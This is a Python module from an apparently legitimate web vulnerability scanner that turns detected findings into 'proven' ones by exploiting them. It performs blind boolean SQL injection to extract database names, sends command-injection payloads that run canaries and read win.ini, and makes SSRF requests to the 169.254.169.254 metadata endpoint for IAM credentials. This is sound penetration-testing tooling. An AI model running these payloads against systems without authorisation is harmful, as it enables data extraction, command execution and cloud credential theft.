"""Auto-proof engine: turn 'detected' into 'proven'.

A scanner says "this parameter is probably injectable". A pentester
proves it by pulling real data out. This module does the safe version
of that for the findings where proof is mechanical:

* SQL injection  -> extract the database name (or, on SQLite, the first
  user table name) character by character through the boolean channel
  the check already confirmed. Read-only, capped, no writes, no dumps.
* Command injection -> re-execute a FRESH computed canary (different
  arithmetic from the one the check used), so the proof is live, not
  a replay of the original observation.
* SSRF -> try the cloud metadata endpoints through the same parameter;
  out-of-band SSRF is already ground truth and is simply marked proven.
* File upload -> execution findings are proven by construction (the
  check's marker was computed server-side); stored-file findings are
  re-fetched to confirm the marker is still served.
* Browser-confirmed XSS -> execution already happened in Chromium.

Anything that does not reproduce is left exactly as the check reported
it — proof failure never downgrades a finding.
"""
import re
import time
import urllib.parse

from .checks import _sim
from .core import params_of, with_param

# ---------------------------------------------------------------- SQLi

_PROFILES = {
    "MySQL": {"len": "LENGTH", "sub": "SUBSTRING", "code": "ASCII",
              "exprs": ["database()"]},
    "PostgreSQL": {"len": "LENGTH", "sub": "SUBSTRING", "code": "ASCII",
                   "exprs": ["current_database()"]},
    "MSSQL": {"len": "LEN", "sub": "SUBSTRING", "code": "ASCII",
              "exprs": ["db_name()"]},
    "SQLite": {"len": "LENGTH", "sub": "SUBSTR", "code": "UNICODE",
               "exprs": ["(SELECT name FROM sqlite_master "
                         "WHERE type='table' AND name NOT LIKE "
                         "'sqlite_%' LIMIT 1)"]},
    "Oracle": {"len": "LENGTH", "sub": "SUBSTR", "code": "ASCII",
               "exprs": ["(SELECT SYS_CONTEXT('USERENV','DB_NAME') "
                         "FROM DUAL)"]},
}
_PROFILE_ORDER = ["MySQL", "PostgreSQL", "SQLite", "MSSQL", "Oracle"]


class _Oracle:
    """Boolean channel over one injection context."""

    def __init__(self, ctx, url, name, orig, profile, template):
        self.ctx = ctx
        self.client = ctx.client
        self.url, self.name, self.orig = url, name, orig
        self.p = profile
        self.template = template
        self.requests = 0
        self.base = self.client.fetch(url).body or ""
        self.true = self._ask_raw("1=1")
        self.false = self._ask_raw("1=2")

    def _build(self, cond):
        return with_param(self.url, self.name,
                          self.template.format(orig=self.orig, cond=cond))

    def _ask_raw(self, cond, raw=False):
        self.requests += 1
        r = self.client.fetch(self._build(cond))
        return r.body or ""

    def usable(self):
        if not self.base or not self.true or not self.false:
            return False
        st = _sim(self.ctx, self.base, self.true)
        sf = _sim(self.ctx, self.base, self.false)
        stf = _sim(self.ctx, self.true, self.false)
        return (st > 0.95 and sf < 0.80) or \
            (st > 0.90 and stf < 0.95 and st - stf > 0.03)

    def ask(self, cond):
        body = self._ask_raw(cond)
        st = _sim(self.ctx, body, self.true)
        sf = _sim(self.ctx, body, self.false)
        return st > 0.90 and st - sf > 0.05


def _extract(oracle, expr, deadline):
    """Binary-search LENGTH(expr), then each character's code."""
    p = oracle.p
    def q(cond):
        if oracle.ctx.stop.is_set() or time.time() > deadline:
            raise TimeoutError
        return oracle.ask(cond)
    lo, hi = 0, 33
    if not q(f"{p['len']}({expr})>0"):
        return ""
    while lo + 1 < hi:
        mid = (lo + hi) // 2
        if q(f"{p['len']}({expr})>{mid}"):
            lo = mid
        else:
            hi = mid
    length = lo + 1
    if length <= 0 or length > 32:
        return ""
    out = []
    for i in range(1, length + 1):
        lo, hi = 31, 127
        while lo + 1 < hi:
            mid = (lo + hi) // 2
            if q(f"{p['code']}({p['sub']}({expr},{i},1))>{mid}"):
                lo = mid
            else:
                hi = mid
        out.append(chr(lo + 1))
    return "".join(out)


def prove_sqli(ctx, finding, deadline_s=150):
    """Returns the extracted string, or '' when no channel verifies."""
    url, name = finding["url"], finding.get("param") or ""
    params = dict(params_of(url))
    if name not in params:
        return ""
    orig = params[name]
    hint = ""
    m = re.search(r"(MySQL|PostgreSQL|MSSQL|SQLite|Oracle)",
                  (finding.get("proof") or "") + (finding.get("detail") or ""))
    if m:
        hint = m.group(1)
    order = ([hint] if hint in _PROFILES else []) + \
        [p for p in _PROFILE_ORDER if p != hint]
    deadline = time.time() + deadline_s
    templates = ["{orig}' AND ({cond})-- -", "{orig} AND ({cond})"]
    for pname in order:
        profile = _PROFILES[pname]
        for template in templates:
            if ctx.stop.is_set() or time.time() > deadline:
                return ""
            oracle = _Oracle(ctx, url, name, orig, profile, template)
            if not oracle.usable():
                continue
            for expr in profile["exprs"]:
                try:
                    data = _extract(oracle, expr, deadline)
                except TimeoutError:
                    return ""
                if data and all(32 <= ord(c) < 127 for c in data):
                    return data
    return ""


# ---------------------------------------------------------------- CmdI

def prove_cmdi(ctx, finding):
    """Re-execute with NEW arithmetic (8100+217) the check never used."""
    url, name = finding["url"], finding.get("param") or ""
    params = dict(params_of(url))
    if name not in params:
        return False
    orig = params[name]
    expr, token = "WSC$((8100+217))Z", "WSC8317Z"
    for tpl in (";echo {t}", "|echo {t}", "$(echo {t})", "`echo {t}`",
                "&echo {t}", "||echo {t}"):
        value = orig + tpl.format(t=expr)
        r = ctx.client.fetch(with_param(url, name, value))
        if r.status and token in (r.body or "") and value not in r.body:
            return True
    for tpl in ("& type C:\\Windows\\win.ini", "| type C:\\Windows\\win.ini"):
        r = ctx.client.fetch(with_param(url, name, orig + tpl))
        if r.status and "[fonts]" in (r.body or ""):
            return True
    return False


# ---------------------------------------------------------------- SSRF

_META_MARKERS = re.compile(
    r"(ami-id|instance-id|security-credentials|AccessKeyId|iam/)", re.I)


def prove_ssrf_metadata(ctx, finding):
    url, name = finding["url"], finding.get("param") or ""
    if name not in dict(params_of(url)):
        return ""
    for target in ("http://169.254.169.254/latest/meta-data/"
                   "iam/security-credentials/",
                   "http://169.254.169.254/latest/meta-data/"):
        r = ctx.client.fetch(with_param(url, name, target))
        body = r.body or ""
        if r.status and _META_MARKERS.search(body):
            return body.strip()[:160]
    return ""


# ---------------------------------------------------------------- main

def prove(ctx):
    """Run auto-proof over the current findings. Mutates findings in
    place: sets proof_verified / proof_data and appends to proof."""
    proven = 0
    sqli_done = 0
    for f in list(ctx.findings.items):
        if ctx.stop.is_set():
            break
        title = f.get("title") or ""
        try:
            if "SQL Injection" in title and f.get("param") \
                    and sqli_done < 2:
                sqli_done += 1
                ctx.emit("Auto-proof: extracting live data through the "
                         f"SQL injection on {f['url']} ...")
                data = prove_sqli(ctx, f)
                if data:
                    f["proof_data"] = data
                    f["proof_verified"] = True
                    f["proof"] = (f.get("proof") or "") + \
                        f" | AUTO-PROOF: extracted live data '{data}' " \
                        "through the injection (boolean channel, " \
                        "read-only)."
                    proven += 1
            elif title.startswith("OS Command Injection") and f.get("param"):
                if prove_cmdi(ctx, f):
                    f["proof_verified"] = True
                    f["proof"] = (f.get("proof") or "") + \
                        " | AUTO-PROOF: a fresh computed canary " \
                        "(8100+217) re-executed on demand."
                    proven += 1
            elif "Server-Side Request Forgery" in title:
                if "out-of-band" in title:
                    f["proof_verified"] = True  # server-side ground truth
                    proven += 1
                elif f.get("param"):
                    meta = prove_ssrf_metadata(ctx, f)
                    if meta:
                        f["proof_data"] = meta
                        f["proof_verified"] = True
                        f["proof"] = (f.get("proof") or "") + \
                            " | AUTO-PROOF: cloud metadata reached " \
                            f"through the parameter: {meta[:80]}"
                        proven += 1
            elif title.startswith("File Upload"):
                if "Remote Code Execution" in title:
                    f["proof_verified"] = True  # computed output, by design
                    proven += 1
                else:
                    r = ctx.client.fetch(f["url"])
                    if r.status == 200 and "WSUPLOAD7391" in (r.body or ""):
                        f["proof_verified"] = True
                        f["proof_data"] = "uploaded marker file still served"
                        proven += 1
            elif "browser-confirmed" in title:
                f["proof_verified"] = True
                proven += 1
        except Exception:
            continue
    if proven:
        ctx.emit(f"Auto-proof: {proven} finding(s) upgraded from "
                 "detected to proven.")
    return proven
